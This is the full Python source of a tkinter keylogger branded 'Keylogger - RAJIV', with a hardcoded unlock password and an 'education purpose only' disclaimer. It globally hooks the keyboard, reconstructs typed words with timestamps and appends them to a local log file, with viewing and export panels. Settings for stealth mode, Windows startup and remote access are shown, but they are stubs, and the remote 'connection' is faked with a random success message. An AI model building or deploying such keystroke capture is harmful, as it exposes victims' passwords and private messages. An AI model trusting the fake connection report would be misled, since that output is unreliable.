from tkinter import *
from tkinter import messagebox, filedialog
from tkinter.scrolledtext import ScrolledText
from PIL import Image, ImageTk, ImageSequence
import threading
import time
import pygame
import os
import keyboard
import json
from datetime import datetime
import socket
import sys
import shutil

LOG_FILE = "keylogs.txt"
SETTINGS_FILE = "settings.json"
LOG_BUFFER = []
LOG_BUFFER_LOCK = threading.Lock()
LIVE_VIEWER_WINDOWS = []
CURRENT_WORD = []  

import sys
import os

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)


def check_password():
    correct_password = "@K3yl0gg3r" 
    entered_password = passwdEntry.get()

    if entered_password == correct_password:
        root.withdraw()
        show_loading_screen()
    else:
        messagebox.showerror("Access Denied", "Incorrect Password")

def show_loading_screen():
    loading = Toplevel()
    loading.title("Keylogger - RAJIV")
    loading.geometry("600x350")
    loading.resizable(False, False)
    
    try:
        root.iconbitmap(resource_path("icon.ico"))
    except:
        pass

    try:
        bg_img = Image.open(resource_path("background.jpg")).resize((600, 350))
        bg_photo = ImageTk.PhotoImage(bg_img)
        loading.bg_photo = bg_photo

        bg_label = Label(loading, image=bg_photo)
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)
    except:
        bg_label = Label(loading, bg="#612323")
        bg_label.place(x=0, y=0, relwidth=1, relheight=1)

    try:
        pygame.mixer.init()
        pygame.mixer.music.load(resource_path("loading.wav"))
        pygame.mixer.music.play()

        def stop_music():
            time.sleep(3)
            pygame.mixer.music.stop()

        threading.Thread(target=stop_music, daemon=True).start()
    except:
        print("Loading sound not found or pygame not installed.")

    try:
        gif = Image.open(resource_path("loader.gif"))
        frames = [ImageTk.PhotoImage(frame.copy().resize((200, 200))) for frame in ImageSequence.Iterator(gif)]
        gif_label = Label(loading, bg="#612323")
        gif_label.pack(pady=40)


        def animate(index=0):
            gif_label.configure(image=frames[index])
            index = (index + 1) % len(frames)
            loading.after(100, animate, index)

        animate()
    except:
        gif_label = Label(loading, text="Loading...", bg="#612323", fg="white")
        gif_label.pack(pady=40)

    loading_text = Label(loading, text="Loading... Please wait", font="Consolas 15 bold", fg="white", bg="#612323")
    loading_text.pack()

    def finish_loading():
        time.sleep(2)
        loading.destroy()
        open_main_panel()
        root.destroy()

    threading.Thread(target=finish_loading, daemon=True).start()

class MainPanel:
    def __init__(self, master):
        self.master = master
        self.master.geometry("600x550")
        self.master.title("Keylogger - RAJIV")
        try:
            self.master.iconbitmap(resource_path("icon.ico"))
        except:
            pass

        self.settings = self.load_settings()
        
        try:
            bg_img = Image.open(resource_path("background.jpg")).resize((900, 650))
            bg_photo = ImageTk.PhotoImage(bg_img)
            self.master.bg_photo = bg_photo

            bg_label = Label(self.master, image=bg_photo)
            bg_label.place(x=0, y=0, relwidth=1, relheight=1)
        except:
            bg_label = Label(self.master, bg="#612323")
            bg_label.place(x=0, y=0, relwidth=1, relheight=1)

        Label(self.master, text="✅ Access Granted!", font="Consolas 14 bold", 
              bg="#612323", fg="#1FFF01").pack(pady=20)
        
        self.logging_active = False
        self.keyboard_listener = None
        self.setup_ui()

        self.apply_settings()

    def setup_ui(self):
        self.main_frame = Frame(self.master, bg="#612323", padx=10, pady=10)
        self.main_frame.pack(fill=BOTH, expand=True)

        self.notebook = Frame(self.main_frame, bg="#612323")
        self.notebook.pack(fill=BOTH, expand=True)

        self.tab_control = Frame(self.notebook, bg="#612323")
        self.tab_control.pack(fill=X)
        
        self.tabs = {}
        self.tab_frames = {}

        tabs = ["Dashboard", "Log Management", "Remote Access", "Settings"]
        for i, tab in enumerate(tabs):
            btn = Button(self.tab_control, text=tab, bg="#B6A9A9", fg="black",
                        font=("Consolas", 10, "bold"), relief=FLAT,
                        command=lambda t=tab: self.show_tab(t))
            btn.pack(side=LEFT, padx=2)
            self.tabs[tab] = btn

        self.content_frame = Frame(self.notebook, bg="#221c1c")
        self.content_frame.pack(fill=BOTH, expand=True)

        self.setup_dashboard_tab()
        self.setup_logging_tab()
        self.setup_remote_tab()
        self.setup_settings_tab()

        self.show_tab("Dashboard")

        self.status_var = StringVar()
        self.status_var.set("Ready")
        self.status_bar = Label(self.main_frame, textvariable=self.status_var, 
                              bg="#B6A9A9", fg="black", font=("Consolas", 9),
                              relief=SUNKEN, anchor=W)
        self.status_bar.pack(fill=X)

    def show_tab(self, tab_name):
        for frame in self.tab_frames.values():
            frame.pack_forget()

        self.tab_frames[tab_name].pack(fill=BOTH, expand=True)

        for name, btn in self.tabs.items():
            btn.config(bg="#B6A9A9" if name != tab_name else "#d0c4c4")  

    def setup_dashboard_tab(self):
        frame = Frame(self.content_frame, bg="#612323")
        self.tab_frames["Dashboard"] = frame

        control_frame = LabelFrame(frame, text="Controls", bg="#612323", fg="white",
                                 font=("Consolas", 10, "bold"), padx=10, pady=10)
        control_frame.pack(fill=X, padx=5, pady=5)
        
        self.start_button = Button(control_frame, text="Start Logging", bg="#B6A9A9", fg="black",
                                 font=("Consolas", 9, "bold"), relief=RAISED,
                                 command=self.toggle_logging)
        self.start_button.pack(side=LEFT, padx=5)
        
        Button(control_frame, text="View Live Keys", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.show_live_viewer).pack(side=LEFT, padx=5)

        log_frame = LabelFrame(frame, text="Quick Log Access", bg="#612323", fg="white",
                             font=("Consolas", 10, "bold"), padx=10, pady=10)
        log_frame.pack(fill=BOTH, expand=True, padx=5, pady=5)
        
        Button(log_frame, text="View Logs", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.view_logs).pack(side=LEFT, padx=5)
        Button(log_frame, text="Delete Logs", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.delete_logs).pack(side=LEFT, padx=5)
        Button(log_frame, text="Export Logs", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.export_logs).pack(side=LEFT, padx=5)

        self.activity_frame = LabelFrame(frame, text="Activity Monitor", bg="#612323", fg="white",
                                       font=("Consolas", 10, "bold"), padx=10, pady=10)
        self.activity_frame.pack(fill=BOTH, expand=True, padx=5, pady=5)
        
        self.activity_text = ScrolledText(self.activity_frame, height=10, state=DISABLED,
                                        bg="#B6A9A9", fg="white", insertbackground="white",
                                        font=("Consolas", 10))
        self.activity_text.pack(fill=BOTH, expand=True)

    def setup_logging_tab(self):
        frame = Frame(self.content_frame, bg="#612323")
        self.tab_frames["Log Management"] = frame

        log_viewer_frame = LabelFrame(frame, text="Log Viewer", bg="#612323", fg="white",
                                    font=("Consolas", 10, "bold"), padx=10, pady=10)
        log_viewer_frame.pack(fill=BOTH, expand=True, padx=5, pady=5)
        
        self.log_text = ScrolledText(log_viewer_frame, height=20, state=DISABLED,
                                   bg="#B6A9A9", fg="white", insertbackground="white",
                                   font=("Consolas", 10))
        self.log_text.pack(fill=BOTH, expand=True)

        log_control_frame = Frame(frame, bg="#612323")
        log_control_frame.pack(fill=X, padx=5, pady=5)
        
        Button(log_control_frame, text="Refresh", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.refresh_logs).pack(side=LEFT, padx=5)
        Button(log_control_frame, text="Clear Logs", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.clear_logs).pack(side=LEFT, padx=5)
        Button(log_control_frame, text="Export Selected", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.export_selected).pack(side=LEFT, padx=5)

    def setup_remote_tab(self):
        frame = Frame(self.content_frame, bg="#612323")
        self.tab_frames["Remote Access"] = frame

        connection_frame = LabelFrame(frame, text="Remote Connection", bg="#612323", fg="white",
                                    font=("Consolas", 10, "bold"), padx=10, pady=10)
        connection_frame.pack(fill=X, padx=5, pady=5)
        
        self.remote_enabled = BooleanVar(value=self.settings.get("remote_enabled", False))
        Checkbutton(connection_frame, text="Enable Remote Access", bg="#612323", fg="white",
                   font=("Consolas", 9), variable=self.remote_enabled,
                   selectcolor="#612323").pack(anchor=W)
        
        Label(connection_frame, text="Server IP:", bg="#612323", fg="white",
             font=("Consolas", 9)).pack(anchor=W)
        self.server_ip = Entry(connection_frame, bg="#B6A9A9", fg="white",
                             font=("Consolas", 9), insertbackground="white")
        self.server_ip.insert(0, self.settings.get("server_ip", ""))
        self.server_ip.pack(fill=X, pady=2)
        
        Label(connection_frame, text="Port:", bg="#612323", fg="white",
             font=("Consolas", 9)).pack(anchor=W)
        self.server_port = Entry(connection_frame, bg="#B6A9A9", fg="white",
                               font=("Consolas", 9), insertbackground="white")
        self.server_port.insert(0, self.settings.get("server_port", "5555"))
        self.server_port.pack(fill=X, pady=2)
        
        Button(connection_frame, text="Connect", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.connect_remote).pack(pady=5)

        status_frame = LabelFrame(frame, text="Connection Status", bg="#612323", fg="white",
                                font=("Consolas", 10, "bold"), padx=10, pady=10)
        status_frame.pack(fill=BOTH, expand=True, padx=5, pady=5)
        
        self.connection_status = ScrolledText(status_frame, height=10, state=DISABLED,
                                            bg="#B6A9A9", fg="white", insertbackground="white",
                                            font=("Consolas", 10))
        self.connection_status.pack(fill=BOTH, expand=True)

    def setup_settings_tab(self):
        frame = Frame(self.content_frame, bg="#612323")
        self.tab_frames["Settings"] = frame

        security_frame = LabelFrame(frame, text="Security", bg="#612323", fg="white",
                                  font=("Consolas", 10, "bold"), padx=10, pady=10)
        security_frame.pack(fill=X, padx=5, pady=5)
        
        self.password_enabled = BooleanVar(value=self.settings.get("password_enabled", False))
        Checkbutton(security_frame, text="Password Protection", bg="#612323", fg="white",
                   font=("Consolas", 9), variable=self.password_enabled,
                   command=self.toggle_password_fields,
                   selectcolor="#612323").pack(anchor=W)
        
        self.password_frame = Frame(security_frame, bg="#612323")
        
        Label(self.password_frame, text="Password:", bg="#612323", fg="white",
             font=("Consolas", 9)).pack(anchor=W)
        self.password_entry = Entry(self.password_frame, show="*", bg="#8a3a3a", fg="white",
                                  font=("Consolas", 9), insertbackground="white")
        self.password_entry.insert(0, self.settings.get("password", ""))
        self.password_entry.pack(fill=X, pady=2)
        
        Label(self.password_frame, text="Confirm Password:", bg="#612323", fg="white",
             font=("Consolas", 9)).pack(anchor=W)
        self.confirm_password = Entry(self.password_frame, show="*", bg="#8a3a3a", fg="white",
                                    font=("Consolas", 9), insertbackground="white")
        self.confirm_password.insert(0, self.settings.get("password", ""))
        self.confirm_password.pack(fill=X, pady=2)

        stealth_frame = LabelFrame(frame, text="Stealth Mode", bg="#612323", fg="white",
                                font=("Consolas", 10, "bold"), padx=10, pady=10)
        stealth_frame.pack(fill=X, padx=5, pady=5)
        
        self.stealth_enabled = BooleanVar(value=self.settings.get("stealth_enabled", False))
        Checkbutton(stealth_frame, text="Enable Stealth Mode", 
                   bg="#612323", fg="white", font=("Consolas", 9),
                   variable=self.stealth_enabled,
                   selectcolor="#612323").pack(anchor=W)

        startup_frame = LabelFrame(frame, text="Startup", bg="#612323", fg="white",
                                 font=("Consolas", 10, "bold"), padx=10, pady=10)
        startup_frame.pack(fill=X, padx=5, pady=5)
        
        self.startup_enabled = BooleanVar(value=self.settings.get("startup_enabled", False))
        Checkbutton(startup_frame, text="Start with Windows", bg="#612323", fg="white",
                   font=("Consolas", 9), variable=self.startup_enabled,
                   selectcolor="#612323").pack(anchor=W)

        cleaning_frame = LabelFrame(frame, text="Log Maintenance", bg="#612323", fg="white",
                                  font=("Consolas", 10, "bold"), padx=10, pady=10)
        cleaning_frame.pack(fill=X, padx=5, pady=5)
        
        self.auto_clean_enabled = BooleanVar(value=self.settings.get("auto_clean_enabled", False))
        Checkbutton(cleaning_frame, text="Enable Auto Log Cleaning", 
                   bg="#612323", fg="white", font=("Consolas", 9),
                   variable=self.auto_clean_enabled, command=self.toggle_clean_fields,
                   selectcolor="#612323").pack(anchor=W)
        
        self.clean_frame = Frame(cleaning_frame, bg="#612323")
        
        Label(self.clean_frame, text="Delete logs older than:", bg="#612323", fg="white",
             font=("Consolas", 9)).pack(side=LEFT)
        self.clean_days = Spinbox(self.clean_frame, from_=1, to=365, width=5,
                                bg="#8a3a3a", fg="white", font=("Consolas", 9))
        self.clean_days.delete(0, "end")
        self.clean_days.insert(0, self.settings.get("clean_days", 7))
        self.clean_days.pack(side=LEFT, padx=5)
        Label(self.clean_frame, text="days", bg="#612323", fg="white",
             font=("Consolas", 9)).pack(side=LEFT)

        Button(frame, text="Save Settings", bg="#B6A9A9", fg="black",
              font=("Consolas", 9, "bold"), relief=RAISED,
              command=self.save_settings).pack(pady=10)
        
        if self.password_enabled.get():
            self.password_frame.pack(fill=X, pady=5)
        if self.auto_clean_enabled.get():
            self.clean_frame.pack(anchor=W, pady=5)
            
    def toggle_password_fields(self):
        if self.password_enabled.get():
            self.password_frame.pack(fill=X, pady=5)
        else:
            self.password_frame.pack_forget()
            
    def toggle_clean_fields(self):
        if self.auto_clean_enabled.get():
            self.clean_frame.pack(anchor=W, pady=5)
        else:
            self.clean_frame.pack_forget()
            
    def toggle_logging(self):
        self.logging_active = not self.logging_active
        if self.logging_active:
            self.start_button.config(text="Stop Logging")
            self.status_var.set("Logging active")
            self.start_keylogger()
        else:
            self.start_button.config(text="Start Logging")
            self.status_var.set("Logging stopped")
            self.stop_keylogger()
            
    def start_keylogger(self):
        if self.keyboard_listener is None:
            self.keyboard_listener = keyboard.hook(self.on_key_event)
            threading.Thread(target=self.log_writer_thread, daemon=True).start()
            
    def stop_keylogger(self):
        if self.keyboard_listener is not None:
            keyboard.unhook(self.keyboard_listener)
            self.keyboard_listener = None
            
    def on_key_event(self, event):
        global CURRENT_WORD
        
        if event.event_type == keyboard.KEY_DOWN:
            key = event.name
            
            boundary_keys = [
                'space', 'enter', 'tab',
                'period', 'comma', 'semicolon', 'colon',
                'exclamation mark', 'question mark',
                'backspace', 'delete', 'esc'
            ]
            
            if key in boundary_keys:
                if CURRENT_WORD:
                    if key == 'backspace':
                        if CURRENT_WORD:
                            CURRENT_WORD.pop()
                            for window in LIVE_VIEWER_WINDOWS:
                                try:
                                    window.handle_backspace()
                                except:
                                    pass
                            return
                    
                    completed_word = ''.join(CURRENT_WORD)
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    log_entry = f"{timestamp} - WORD: {completed_word}"
                    
                    with LOG_BUFFER_LOCK:
                        LOG_BUFFER.append(log_entry)
                    
                    CURRENT_WORD = []
                
                if key not in ['space', 'tab']:
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    log_entry = f"{timestamp} - KEY: [{key.upper()}]"
                    with LOG_BUFFER_LOCK:
                        LOG_BUFFER.append(log_entry)
            elif len(key) == 1:
                CURRENT_WORD.append(key)
            elif len(key) > 1:
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                log_entry = f"{timestamp} - KEY: [{key.upper()}]"
                with LOG_BUFFER_LOCK:
                    LOG_BUFFER.append(log_entry)

        for window in LIVE_VIEWER_WINDOWS:
            try:
                window.update_live_view(event)
            except:
                pass
                
    def log_writer_thread(self):
        while self.logging_active:
            time.sleep(5)
            
            if not LOG_BUFFER:
                continue
                
            with LOG_BUFFER_LOCK:
                logs_to_write = LOG_BUFFER.copy()
                LOG_BUFFER.clear()
                
            try:
                with open(LOG_FILE, "a", encoding="utf-8") as f:
                    for log in logs_to_write:
                        f.write(log + "\n")
            except Exception as e:
                print(f"Error writing logs: {e}")
                
    def show_live_viewer(self):
        live_window = LiveViewerWindow(self.master)
        LIVE_VIEWER_WINDOWS.append(live_window)
            
    def view_logs(self):
        try:
            with open(LOG_FILE, "r", encoding="utf-8") as f:
                logs = f.read()
                
            self.log_text.config(state=NORMAL)
            self.log_text.delete(1.0, END)
            self.log_text.insert(END, logs or "No logs available")
            self.log_text.config(state=DISABLED)
            self.show_tab("Log Management")
        except FileNotFoundError:
            self.log_text.config(state=NORMAL)
            self.log_text.delete(1.0, END)
            self.log_text.insert(END, "No log file found")
            self.log_text.config(state=DISABLED)
            self.show_tab("Log Management")
            
    def delete_logs(self):
        if messagebox.askyesno("Confirm", "Delete all logs?"):
            try:
                os.remove(LOG_FILE)
                self.status_var.set("Logs deleted")
                self.view_logs()
            except Exception as e:
                messagebox.showerror("Error", f"Could not delete logs: {e}")
                self.status_var.set("Error deleting logs")
                
    def export_logs(self):
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if file_path:
            try:
                shutil.copyfile(LOG_FILE, file_path)
                self.status_var.set(f"Logs exported to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Could not export logs: {e}")
                self.status_var.set("Error exporting logs")
                
    def refresh_logs(self):
        self.view_logs()
        
    def clear_logs(self):
        self.log_text.config(state=NORMAL)
        self.log_text.delete(1.0, END)
        self.log_text.config(state=DISABLED)
        
    def export_selected(self):
        selected_text = self.log_text.get(SEL_FIRST, SEL_LAST)
        if not selected_text:
            messagebox.showwarning("Warning", "No text selected")
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=".txt",
            filetypes=[("Text Files", "*.txt"), ("All Files", "*.*")]
        )
        if file_path:
            try:
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(selected_text)
                self.status_var.set(f"Selected text exported to {file_path}")
            except Exception as e:
                messagebox.showerror("Error", f"Could not export: {e}")
                self.status_var.set("Error exporting selected text")
                
    def connect_remote(self):
        if not self.remote_enabled.get():
            self.update_connection_status("Remote access disabled in settings")
            return
            
        ip = self.server_ip.get()
        port = self.server_port.get()
        
        if not ip or not port:
            self.update_connection_status("Please enter both IP and port")
            return
            
        self.update_connection_status(f"Attempting to connect to {ip}:{port}...")
        
        threading.Thread(target=self.simulate_remote_connection, args=(ip, port), daemon=True).start()
        
    def simulate_remote_connection(self, ip, port):
        time.sleep(2)
        
        import random
        if random.random() > 0.3:
            self.update_connection_status(f"Connected to {ip}:{port}\nReady to receive commands")
        else:
            self.update_connection_status(f"Connection to {ip}:{port} failed\nCheck IP/port and try again")
            
    def update_connection_status(self, message):
        self.connection_status.config(state=NORMAL)
        self.connection_status.delete(1.0, END)
        self.connection_status.insert(END, message)
        self.connection_status.config(state=DISABLED)
        
    def save_settings(self):
        settings = {
            "password_enabled": self.password_enabled.get(),
            "password": self.password_entry.get() if self.password_enabled.get() else "",
            "stealth_enabled": self.stealth_enabled.get(),
            "startup_enabled": self.startup_enabled.get(),
            "auto_clean_enabled": self.auto_clean_enabled.get(),
            "clean_days": int(self.clean_days.get()),
            "remote_enabled": self.remote_enabled.get(),
            "server_ip": self.server_ip.get(),
            "server_port": self.server_port.get()
        }
        
        if settings["password_enabled"]:
            if settings["password"] != self.confirm_password.get():
                messagebox.showerror("Error", "Passwords do not match")
                return
            if len(settings["password"]) < 4:
                messagebox.showerror("Error", "Password must be at least 4 characters")
                return
                
        try:
            with open(SETTINGS_FILE, "w") as f:
                json.dump(settings, f)
                
            self.settings = settings
            self.apply_settings()
            messagebox.showinfo("Success", "Settings saved successfully")
            self.status_var.set("Settings saved and applied")
        except Exception as e:
            messagebox.showerror("Error", f"Could not save settings: {e}")
            self.status_var.set("Error saving settings")
            
    def load_settings(self):
        try:
            with open(SETTINGS_FILE, "r") as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            return {}
            
    def apply_settings(self):
        pass

class LiveViewerWindow:
    def __init__(self, master):
        self.window = Toplevel(master)
        self.window.title("Live Key Press Viewer")
        self.window.geometry("500x400")
        self.window.configure(bg="#612323")
        
        self.window.attributes('-topmost', True)
        try:
            self.window.iconbitmap(resource_path("icon.ico"))
        except:
            pass
        
        self.text = ScrolledText(self.window, height=20, bg="#612323", fg="white",
                               insertbackground="white", font=("Consolas", 12),
                               wrap=WORD)
        self.text.pack(fill=BOTH, expand=True, padx=10, pady=10)
        
        self.text.config(state=NORMAL)
        self.text.insert(END, "=== LIVE KEY VIEWER ===\n")
        self.text.insert(END, "Type and watch your keystrokes appear here:\n\n")
        self.text.config(state=DISABLED)
        
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)
        
        self.window.focus_force()

    def update_live_view(self, key_event):
        if key_event.event_type == keyboard.KEY_DOWN:
            key = key_event.name
            
            ignored_keys = [
            'caps lock', 'num lock', 'scroll lock',
            'windows'
            ]
            boundary_keys = ['space', 'tab']
            punctuation_keys = ['period', 'comma', 'semicolon', 'colon', 'exclamation mark', 'question mark']

            self.text.config(state=NORMAL)
            
            if key in ignored_keys:
                pass 

            elif key == 'backspace':
                if CURRENT_WORD:
                    CURRENT_WORD.pop()
                current_text = self.text.get("1.0", "end-1c")
                self.text.delete("1.0", END)
                self.text.insert(END, current_text[:-1])
            elif key in boundary_keys:
                    completed_word = ''.join(CURRENT_WORD)
                    suffix = ' ' if key == 'space' else '\n' 
                    self.text.insert(END, completed_word + suffix)
                    CURRENT_WORD.clear()
              
            elif key in punctuation_keys:
                    self.text.insert(END, f"{key.replace(' ','')}")

            elif len(key) == 1:
                CURRENT_WORD.append(key)
                self.text.insert(END, key)

            else:
                self.text.insert(END, f"\n[{key.upper()}]\n")
            
            self.text.see(END)
            self.text.config(state=DISABLED)
    
    def handle_backspace(self):
        """Handle backspace key specifically"""
        self.text.config(state=NORMAL)
        current_text = self.text.get("1.0", "end-1c")
        self.text.delete("1.0", END)
        self.text.insert(END, current_text)
        self.text.config(state=DISABLED)
    
    def on_close(self):
        if self in LIVE_VIEWER_WINDOWS:
            LIVE_VIEWER_WINDOWS.remove(self)
        self.window.destroy()

def open_main_panel():
    main = Tk()
    MainPanel(main)
    main.mainloop()

root = Tk()
root.geometry("600x350")
root.resizable(False, False)
root.title("Keylogger - RAJIV")
try:
    root.iconbitmap(resource_path("icon.ico"))
except:
    pass

try:
    bg_img = Image.open(resource_path("background.jpg")).resize((600, 350))
    bg_photo = ImageTk.PhotoImage(bg_img)
    bg_label = Label(root, image=bg_photo)
    bg_label.place(x=0, y=0, relwidth=1, relheight=1)
except:
    bg_label = Label(root, bg="#612323")
    bg_label.place(x=0, y=0, relwidth=1, relheight=1)

try:
    img1 = Image.open(resource_path("nail-pin.png")).resize((20, 20))
    tk_image = ImageTk.PhotoImage(img1)
except:
    tk_image = None

Label(root, text="Welcome-To-KeyLogger", font="Consolas 13 bold", bg="#612323", fg="white").place(x=210, y=10)

f1 = Frame(root, bg="#612323", pady=15)
f1.place(x=120, y=40)

if tk_image:
    Label(f1, image=tk_image, bg="#612323").grid(row=0, column=0, padx=10)

Label(
    f1,
    text="NOTE: Education Purpose Only, Author is not \n responsible for any illegal activities",
    font="Consolas 10 bold",
    justify=LEFT,
    bg="#612323",
    fg="white"
).grid(row=0, column=1)

try:
    img2 = Image.open(resource_path("skull.png")).resize((40, 40))
    tk_image2 = ImageTk.PhotoImage(img2)
except:
    tk_image2 = None

f2 = Frame(root, pady=20, padx=8, bg="#612323")
f2.place(x=80, y=150)

if tk_image2:
    Label(root, image=tk_image2, bg="#612323", pady=40, width=50).place(x=80, y=125)

Label(f2, text="Password:", bg="#612323", fg="white", font="Consolas 12 bold").grid(row=0, column=0, pady=10)

passwdEntry = Entry(f2, width=30, justify="left", font="Consolas 15 bold", bg="#B6A9A9", show="*")
passwdEntry.grid(row=0, column=1)
passwdEntry.focus_set()
passwdEntry.bind("<Return>", lambda event: check_password())

Button(f2, text="Submit", width=15, bg="#B6A9A9", command=check_password).grid(row=2, column=1, pady=20)

root.mainloop()

